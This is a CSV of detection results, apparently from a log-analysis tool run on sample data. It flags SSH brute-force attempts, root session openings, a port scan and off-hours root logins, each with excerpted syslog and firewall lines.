detection,failures,first_seen,gap_seconds,geo,host,indicator,ip,last_seen,message,next,ports,ports_sample,prev,process,rdns,sample_lines,timestamp,unique_ports
bruteforce,6,2025-10-14T08:00:01,,{},,,10.0.0.1,2025-10-14T08:00:06,,,,,,,,"['Oct 14 08:00:01 Failed password for invalid user root from 10.0.0.1 port 22', 'Oct 14 08:00:02 Failed password for invalid user root from 10.0.0.1 port 22', 'Oct 14 08:00:03 Failed password for invalid user root from 10.0.0.1 port 22']",,
bruteforce,5,2025-10-14T02:20:01,,{},,,10.0.0.2,2025-10-14T10:00:11,,,,,,,,"['Oct 14 08:05:01 Failed password for invalid user admin from 10.0.0.2 port 22', 'Oct 14 08:05:02 Failed password for invalid user admin from 10.0.0.2 port 22', 'Oct 14 08:05:03 Failed password for invalid user admin from 10.0.0.2 port 22']",,
bruteforce,6,2025-10-14T11:00:01,,{},,,172.16.0.5,2025-10-14T11:00:06,,,,,,,,"['Oct 14 11:00:01 Failed password for invalid user test from 172.16.0.5 port 2222', 'Oct 14 11:00:02 Failed password for invalid user test from 172.16.0.5 port 2222', 'Oct 14 11:00:03 Failed password for invalid user test from 172.16.0.5 port 2222']",,
privilege_escalation,,,,{},server,session opened for user root,,,pam_unix(sshd:session): session opened for user root by (uid=0),,,,,sshd[2001],,['Oct 14 09:00:02 pam_unix(sshd:session): session opened for user root by (uid=0)'],Oct 14 09:00:02,
privilege_escalation,,,,{},server,session opened for user root,,,pam_unix(su:session): session opened for user root by charlie(uid=1002),,,,,su,,['Oct 14 09:01:00 pam_unix(su:session): session opened for user root by charlie(uid=1002)'],Oct 14 09:01:00,
privilege_escalation,,,,{},host1,session opened for user root,,,pam_unix(su:session): session opened for user root by user1,,,,,su,,['Oct 14 03:10:01 pam_unix(su:session): session opened for user root by user1'],Oct 14 03:10:01,
port_scan,,2025-10-14T10:00:01,,{},,,192.168.1.250,2025-10-14T10:00:11,,,,"[21, 22, 23, 25, 53, 80, 110, 143]",,,,"['Oct 14 10:00:01 IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=21', 'Oct 14 10:00:02 IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=22', 'Oct 14 10:00:03 IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=23']",,11
network_login_times,,,,{},host1,login_at_1h,,,Accepted password for root from 10.0.0.5 port 54400 ssh2,,,,,sshd[1234],,['Oct 14 01:10:01 Accepted password for root from 10.0.0.5 port 54400 ssh2'],Oct 14 01:10:01,
network_login_times,,,,{},host1,login_at_2h,,,Accepted password for root from 203.0.113.42 port 54401 ssh2,,,,,sshd[1234],,['Oct 14 02:15:01 Accepted password for root from 203.0.113.42 port 54401 ssh2'],Oct 14 02:15:01,
network_login_times,,,,{},host1,login_at_2h,,,Accepted password for user1 from 10.0.0.20 port 54402 ssh2,,,,,sshd[1234],,['Oct 14 02:20:01 Accepted password for user1 from 10.0.0.20 port 54402 ssh2'],Oct 14 02:20:01,
